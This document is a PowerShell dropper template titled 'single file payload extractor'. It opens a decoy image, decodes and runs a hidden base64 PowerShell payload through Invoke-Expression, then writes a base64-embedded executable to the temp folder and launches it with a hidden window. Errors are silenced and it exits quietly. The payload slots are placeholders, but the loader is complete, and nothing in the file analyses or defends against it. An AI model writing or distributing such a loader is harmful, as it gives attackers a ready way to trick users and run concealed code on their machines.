# ===== SINGLE FILE PAYLOAD EXTRACTOR =====
# Hidden image + executable + script all in one

$ErrorActionPreference = "SilentlyContinue"

# Get this script's path
$scriptPath = $PSScriptRoot
$tempFolder = [System.IO.Path]::GetTempPath()

# ===== 1. EXTRACT AND DISPLAY IMAGE =====
try {
    # Base64 encoded image data (JPEG)
    $imageBase64 = "PLACE_YOUR_IMAGE_BASE64_HERE"
    
    if ($imageBase64 -and $imageBase64 -ne "PLACE_YOUR_IMAGE_BASE64_HERE") {
        $imageBytes = [Convert]::FromBase64String($imageBase64)
        $imagePath = Join-Path $tempFolder ("img_" + [Guid]::NewGuid().ToString().Substring(0, 8) + ".jpg")
        [System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
        
        # Open image
        Start-Process $imagePath
    }
}
catch { }

# ===== 2. EXECUTE HIDDEN POWERSHELL PAYLOAD =====
try {
    $payloadBase64 = "PLACE_YOUR_PAYLOAD_BASE64_HERE"
    
    if ($payloadBase64 -and $payloadBase64 -ne "PLACE_YOUR_PAYLOAD_BASE64_HERE") {
        $payloadBytes = [Convert]::FromBase64String($payloadBase64)
        $payload = [System.Text.Encoding]::UTF8.GetString($payloadBytes)
        Invoke-Expression $payload
    }
}
catch { }

# ===== 3. EXTRACT AND RUN HIDDEN EXECUTABLE =====
try {
    $exeBase64 = "PLACE_YOUR_EXE_BASE64_HERE"
    
    if ($exeBase64 -and $exeBase64 -ne "PLACE_YOUR_EXE_BASE64_HERE") {
        $exeBytes = [Convert]::FromBase64String($exeBase64)
        $exePath = Join-Path $tempFolder ("bin_" + [Guid]::NewGuid().ToString().Substring(0, 8) + ".exe")
        [System.IO.File]::WriteAllBytes($exePath, $exeBytes)
        
        # Run hidden
        Start-Process $exePath -WindowStyle Hidden
    }
}
catch { }

# Exit silently
exit 0
